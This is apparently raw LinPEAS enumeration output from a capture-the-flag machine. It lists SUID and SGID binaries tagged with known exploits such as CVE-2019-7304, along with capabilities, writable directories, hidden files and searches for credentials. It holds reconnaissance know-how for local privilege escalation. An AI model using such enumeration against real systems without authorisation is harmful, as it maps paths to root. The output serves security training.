-rwsr-xr-- 1 root dip 386K Jul 23  2020 /snap/core/11316/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/8689/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8689/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8689/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8689/bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/8689/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/8689/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8689/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/8689/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/8689/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/8689/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jan 31  2020 /snap/core/8689/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Nov 29  2019 /snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/8689/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 105K Feb 12  2020 /snap/core/8689/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/8689/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 27K Jan  8  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-x--- 1 root users 22K Oct 21  2019 /bin/sysinfo (Unknown SUID binary!)
-rwsr-xr-x 1 root root 43K Jan  8  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                        
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent                                                                                                                              
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root crontab 39K Nov 15  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root tty 31K Jan  8  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root mail 14K May 28  2019 /usr/lib/evolution/camel-lock-helper-1.2
-rwsr-sr-x 1 root root 10K Dec 18  2019 /usr/lib/xorg/Xorg.wrap
-rwsr-sr-x 1 root root 107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /snap/core18/2074/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /snap/core18/2074/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /snap/core18/2074/usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /snap/core18/2074/usr/bin/expiry
-rwxr-sr-x 1 root crontab 355K Mar  4  2019 /snap/core18/2074/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /snap/core18/2074/usr/bin/wall
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1668/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /snap/core18/1668/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /snap/core18/1668/usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /snap/core18/1668/usr/bin/expiry
-rwxr-sr-x 1 root crontab 355K Mar  4  2019 /snap/core18/1668/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Aug 22  2019 /snap/core18/1668/usr/bin/wall
-rwxr-sr-x 1 root shadow 83K May 27  2020 /snap/core20/1026/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K May 27  2020 /snap/core20/1026/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Mar  9  2021 /snap/core20/1026/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Jul 21  2020 /snap/core20/1026/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Jul 21  2020 /snap/core20/1026/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jul 21  2020 /snap/core20/1026/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11316/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K May 26  2021 /snap/core/11316/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/11316/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/11316/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  6  2013 /snap/core/11316/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/11316/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/11316/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Jun  7  2021 /snap/core/11316/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/11316/usr/bin/wall
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8689/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8689/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/8689/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/8689/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  6  2013 /snap/core/8689/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/8689/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8689/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8689/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8689/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/8689/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/8689/usr/bin/wall
-rwsr-sr-x 1 root root 105K Feb 12  2020 /snap/core/8689/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                                                                                
/etc/ld.so.conf                                                                                                                                                                         
Content of /etc/ld.so.conf:                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf                                                                                                                                      
  - /usr/lib/x86_64-linux-gnu/libfakeroot                                                                                                                                               
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib                                                                                                                                                                      
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                                                                     
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                                                                                               
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                         
══╣ Current shell capabilities                                                                                                                                                          
CapInh:  0x0000000000000000=                                                                                                                                                            
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                                            
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1026/usr/bin/ping = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                         
                                                                                                                                                                                        
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient                                                                                                                                 
-rw-r--r-- 1 root root 10625 Jun 18  2019 usr.bin.evince
-rw-r--r-- 1 root root  8477 Jul 18  2019 usr.bin.firefox
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root  1519 Jul 16  2019 usr.lib.libreoffice.program.oosplash
-rw-r--r-- 1 root root  1251 Jul 16  2019 usr.lib.libreoffice.program.senddoc
-rw-r--r-- 1 root root  6712 Jul 16  2019 usr.lib.libreoffice.program.soffice.bin
-rw-r--r-- 1 root root  1284 Jul 16  2019 usr.lib.libreoffice.program.xpdfimport
-rw-r--r-- 1 root root 23936 Oct 30  2019 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root   540 Feb 25  2018 usr.sbin.cups-browsed
-rw-r--r-- 1 root root  5552 May 30  2019 usr.sbin.cupsd
-rw-r--r-- 1 root root   643 Jan 16  2018 usr.sbin.ippusbxd
-rw-r--r-- 1 root root  1793 Jan 21  2020 usr.sbin.mysqld
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                 
files with acls in searched folders Not Found                                                                                                                                           
                                                                                                                                                                                        
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                       
total 48                                                                                                                                                                                
drwxr-xr-x   2 root root  4096 Mar 13  2020 .
drwxr-xr-x 127 root root 12288 Jul 12  2021 ..
-rw-r--r--   1 root root    96 Aug 19  2018 01-locale-fix.sh
-rw-r--r--   1 root root   825 Jun  4  2019 apps-bin-path.sh
-rw-r--r--   1 root root   664 Apr  1  2018 bash_completion.sh
-rw-r--r--   1 root root  1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root    15 Oct 21  2019 disable.history.sh
-rw-r--r--   1 root root   652 Apr  3  2019 input-method-config.sh
-rw-r--r--   1 root root  1941 Jul 16  2018 vte-2.91.sh
-rw-r--r--   1 root root   954 May  2  2018 xdg_dirs_desktop_session.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                         
                                                                                                                                                                                        
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                            
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                            
═╣ Can I read shadow files? ............. No                                                                                                                                            
═╣ Can I read shadow plists? ............ No                                                                                                                                            
═╣ Can I write shadow plists? ........... No                                                                                                                                            
═╣ Can I read opasswd file? ............. No                                                                                                                                            
═╣ Can I write in network-scripts? ...... No                                                                                                                                            
═╣ Can I read root folder? .............. No                                                                                                                                            
                                                                                                                                                                                        
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                  
/root/
/var/www
/var/www/html
/var/www/Magic/images/uploads/trx.jpg

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                                                        
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo                                                                                                                                 

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                       
/dev/mqueue                                                                                                                                                                             
/dev/shm
/home/theseus
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/snap/core/11316/run/lock
/snap/core/11316/tmp
/snap/core/11316/var/tmp
/snap/core18/1668/run/lock
/snap/core18/1668/tmp
/snap/core18/1668/var/tmp
/snap/core18/2074/tmp
/snap/core18/2074/var/tmp
/snap/core20/1026/run/lock
/snap/core20/1026/tmp
/snap/core20/1026/var/tmp
/snap/core/8689/run/lock
/snap/core/8689/tmp
/snap/core/8689/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/VMwareDnD
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/php/sessions
/var/metrics
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                       
                                                                                                                                                                                        


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                     
                            ╚═════════════════════════╝                                                                                                                                 
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                              
/usr/bin/gettext.sh                                                                                                                                                                     
/usr/bin/amuFormat.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2021-07-12+04:48:04.0082013420 /var/lib/snapd/desktop/applications/gnome-logs_gnome-logs.desktop                                                                                        
2021-07-12+04:48:00.6602101490 /var/lib/snapd/desktop/applications/gnome-system-monitor_gnome-system-monitor.desktop
2019-10-21+03:45:28.3075780640 /bin/sysinfo
2019-10-15+05:03:21.3454454590 /etc/console-setup/cached_setup_terminal.sh
2019-10-15+05:03:21.3454454590 /etc/console-setup/cached_setup_keyboard.sh
2019-10-15+05:03:21.3454454590 /etc/console-setup/cached_setup_font.sh

╔══════════╣ Unexpected in root
/vmlinuz                                                                                                                                                                                
/initrd.img
/swapfile
/vmlinuz.old
/initrd.img.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/theseus/.gnupg/trustdb.gpg                                                                                                                                                        
/home/theseus/.gnupg/pubring.kbx
/var/log/auth.log
/var/log/kern.log
/var/log/vmware-vmsvc-root.log
/var/log/syslog
/var/log/journal/1456d592d9a64495ba5b92bdbdb0cc08/user-1000.journal
/var/log/journal/1456d592d9a64495ba5b92bdbdb0cc08/system.journal

logrotate 3.11.0

╔══════════╣ Files inside /home/theseus (limit 20)
total 80                                                                                                                                                                                
drwxr-xr-x 15 theseus theseus 4096 Jul 12  2021 .
drwxr-xr-x  3 root    root    4096 Jul  6  2021 ..
lrwxrwxrwx  1 theseus theseus    9 Oct 21  2019 .bash_history -> /dev/null
-rw-r--r--  1 theseus theseus  220 Oct 15  2019 .bash_logout
-rw-r--r--  1 theseus theseus   15 Oct 21  2019 .bash_profile
-rw-r--r--  1 theseus theseus 3771 Oct 15  2019 .bashrc
drwxrwxr-x 13 theseus theseus 4096 Jul  6  2021 .cache
drwx------ 13 theseus theseus 4096 Jul  6  2021 .config
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Desktop
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Documents
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Downloads
drwx------  3 theseus theseus 4096 Feb 23 10:48 .gnupg
-rw-------  1 theseus theseus  954 Jul 12  2021 .ICEauthority
drwx------  3 theseus theseus 4096 Jul  6  2021 .local
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Music
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Pictures
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Public
drwx------  2 theseus theseus 4096 Feb 23 10:31 .ssh
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Templates
-r--------  1 theseus theseus   33 Feb 23 08:09 user.txt
drwxr-xr-x  2 theseus theseus 4096 Jul  6  2021 Videos

╔══════════╣ Files inside others home (limit 20)
/var/www/Magic/logout.php                                                                                                                                                               
/var/www/Magic/assets/sass/noscript.scss
/var/www/Magic/assets/sass/main.scss
/var/www/Magic/assets/sass/libs/_breakpoints.scss
/var/www/Magic/assets/sass/libs/_functions.scss
/var/www/Magic/assets/sass/libs/_mixins.scss
/var/www/Magic/assets/sass/libs/_vars.scss
/var/www/Magic/assets/sass/libs/_vendor.scss
/var/www/Magic/assets/css/noscript.css
/var/www/Magic/assets/css/main.css
/var/www/Magic/assets/css/fontawesome-all.min.css
/var/www/Magic/assets/css/upload.css
/var/www/Magic/assets/css/images/ie/banner-overlay.png
/var/www/Magic/assets/css/images/loader.gif
/var/www/Magic/assets/css/images/overlay.png
/var/www/Magic/assets/css/images/arrow.svg
/var/www/Magic/assets/js/jquery.poptrox.min.js
/var/www/Magic/assets/js/util.js
/var/www/Magic/assets/js/upload.js
/var/www/Magic/assets/js/breakpoints.min.js

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                        
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                        
╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 1086 Sep 15  2019 /usr/src/linux-headers-5.3.0-42/tools/testing/selftests/net/tcp_fastopen_backup_key.sh                                                         
-rwxr-xr-x 1 root root 1086 Sep 15  2019 /usr/src/linux-headers-5.3.0-40/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 235821 Feb  3  2020 /usr/src/linux-headers-5.3.0-40-generic/.config.old
-rw-r--r-- 1 root root 0 Feb  3  2020 /usr/src/linux-headers-5.3.0-40-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Feb  3  2020 /usr/src/linux-headers-5.3.0-40-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 235842 Feb 28  2020 /usr/src/linux-headers-5.3.0-42-generic/.config.old
-rw-r--r-- 1 root root 0 Feb 28  2020 /usr/src/linux-headers-5.3.0-42-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Feb 28  2020 /usr/src/linux-headers-5.3.0-42-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 974 Mar 16  2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-auto.page
-rw-r--r-- 1 root root 755 Mar 16  2018 /usr/share/help-langpack/en_GB/org.gnome.DejaDup/backup-first.page
-rw-r--r-- 1 root root 2543 Apr 13  2018 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 974 Mar 16  2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-auto.page
-rw-r--r-- 1 root root 755 Mar 16  2018 /usr/share/help-langpack/en_AU/org.gnome.DejaDup/backup-first.page
-rw-r--r-- 1 root root 1262 Apr 15  2018 /usr/share/help/C/gnome-help/backup-why.page
-rw-r--r-- 1 root root 1320 Apr 15  2018 /usr/share/help/C/gnome-help/backup-restore.page
-rw-r--r-- 1 root root 1999 Apr 15  2018 /usr/share/help/C/gnome-help/backup-frequency.page
-rw-r--r-- 1 root root 2356 Apr 15  2018 /usr/share/help/C/gnome-help/backup-how.page
-rw-r--r-- 1 root root 1815 Apr 15  2018 /usr/share/help/C/gnome-help/backup-check.page
-rw-r--r-- 1 root root 2505 Apr 15  2018 /usr/share/help/C/gnome-help/backup-what.page
-rw-r--r-- 1 root root 3318 Apr 15  2018 /usr/share/help/C/gnome-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2268 Apr 15  2018 /usr/share/help/C/gnome-help/backup-where.page
-rwxr-xr-x 1 root root 1513 Oct 19  2013 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 361345 Feb  1  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 14552 Mar 13  2020 /usr/share/info/dir.old
-rw-r--r-- 1 root root 35544 Dec  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /home/theseus/.local/share/evolution/addressbook/system/contacts.db: SQLite 3.x database, last written using SQLite version 3022000                                               
Found /home/theseus/.local/share/zeitgeist/activity.sqlite: SQLite 3.x database, last written using SQLite version 3022000
Found /snap/core/11316/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /snap/core/8689/lib/firmware/regulatory.db: CRDA wireless regulatory database file
Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3022000
Found /var/lib/mlocate/mlocate.db: regular file, no read permission
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3022000

 -> Extracting tables from /home/theseus/.local/share/evolution/addressbook/system/contacts.db (limit 20)
  --> Found interesting column names in folder_id_email_list (output limit 10)                                                                                                          
CREATE TABLE 'folder_id_email_list' (uid TEXT NOT NULL REFERENCES 'folder_id' (uid), value TEXT)                                                                                        

 -> Extracting tables from /home/theseus/.local/share/zeitgeist/activity.sqlite (limit 20)
 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)                                                                                                                        
 -> Extracting tables from /var/lib/colord/storage.db (limit 20)                                                                                                                        
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                                         
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)                                                                                                               
                                                                                                                                                                                        
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                              
total 16K
drwxr-xr-x  4 root     root     4.0K Jul  6  2021 .
drwxr-xr-x 15 root     root     4.0K Jul  6  2021 ..
drwxr-xr-x  2 root     root     4.0K Jul  6  2021 html
drwxr-xr-x  4 www-data www-data 4.0K Jul 12  2021 Magic

/var/www/html:
total 8.0K
drwxr-xr-x 2 root root 4.0K Jul  6  2021 .

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Feb 23 08:08 /run/network/.ifstate.lock                                                                                                                        
-rw------- 1 root root 0 Jun 10  2021 /snap/core18/2074/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /snap/core18/2074/etc/skel/.bash_logout
-rw------- 1 root root 0 Jan 23  2020 /snap/core18/1668/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /snap/core18/1668/etc/skel/.bash_logout
-rw------- 1 root root 0 Apr 28  2021 /snap/core20/1026/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1026/etc/skel/.bash_logout
-rw------- 1 root root 0 Jun 15  2021 /snap/core/11316/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/11316/etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 12  2020 /snap/core/8689/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Aug 31  2015 /snap/core/8689/etc/skel/.bash_logout
-rw-r--r-- 1 root root 0 Nov 15  2018 /snap/gnome-3-38-2004/39/usr/share/dictionaries-common/site-elisp/.nosearch
-rw-r--r-- 1 root root 1913 Oct 15  2019 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Aug  5  2019 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-r--r--r-- 1 gdm gdm 11 Feb 23 08:09 /tmp/.X1024-lock
-rwx---r-x 1 theseus theseus 162 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/n9iNDE/Magic/.htaccess
-rw-r--r-- 1 theseus theseus 6148 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/n9iNDE/Magic/.DS_Store
-rw-r--r-- 1 theseus theseus 6148 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/n9iNDE/Magic/images/.DS_Store
-rwx---r-x 1 theseus theseus 162 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/xDY35m/Magic/.htaccess
-rw-r--r-- 1 theseus theseus 6148 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/xDY35m/Magic/.DS_Store
-rw-r--r-- 1 theseus theseus 6148 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/xDY35m/Magic/images/.DS_Store
-rwx---r-x 1 theseus theseus 162 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/oTE2FR/Magic/.htaccess
-rw-r--r-- 1 theseus theseus 6148 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/oTE2FR/Magic/.DS_Store
-rw-r--r-- 1 theseus theseus 6148 Oct 18  2019 /home/theseus/.cache/vmware/drag_and_drop/oTE2FR/Magic/images/.DS_Store
-rw------- 1 theseus theseus 954 Jul 12  2021 /home/theseus/.ICEauthority
-rw-r--r-- 1 theseus theseus 220 Oct 15  2019 /home/theseus/.bash_logout
-rwx---r-x 1 www-data www-data 162 Oct 18  2019 /var/www/Magic/.htaccess
-rw-r--r-- 1 root root 1913 Oct 15  2019 /var/cache/apparmor/.features
-rw------- 1 gdm gdm 8224 Feb 23 08:09 /var/lib/gdm3/.ICEauthority

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-r--r--r-- 1 gdm gdm 11 Feb 23 08:09 /tmp/.X1024-lock                                                                                                                                   
-rw-r--r-- 1 root root 3937 Mar 17  2020 /var/backups/alternatives.tar.2.gz
-rw-r--r-- 1 root root 3427 Oct 16  2019 /var/backups/alternatives.tar.6.gz
-rw-r--r-- 1 root root 81920 Feb 23 08:13 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 43 Oct 15  2019 /var/backups/dpkg.arch.6.gz
-rw-r--r-- 1 root root 3625 Oct 19  2019 /var/backups/alternatives.tar.4.gz
-rw-r--r-- 1 root root 43 Oct 15  2019 /var/backups/dpkg.arch.2.gz
-rw-r--r-- 1 root root 43 Oct 15  2019 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 root root 43 Oct 15  2019 /var/backups/dpkg.arch.3.gz
-rw-r--r-- 1 root root 43 Oct 15  2019 /var/backups/dpkg.arch.4.gz
-rw-r--r-- 1 root root 3923 Jul  6  2021 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 3631 Oct 18  2019 /var/backups/alternatives.tar.5.gz
-rw-r--r-- 1 root root 43 Oct 15  2019 /var/backups/dpkg.arch.5.gz
-rw-r--r-- 1 root root 11 Oct 15  2019 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 3916 Oct 22  2019 /var/backups/alternatives.tar.3.gz

╔══════════╣ Searching passwords in history files
                                                                                                                                                                                        
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                               
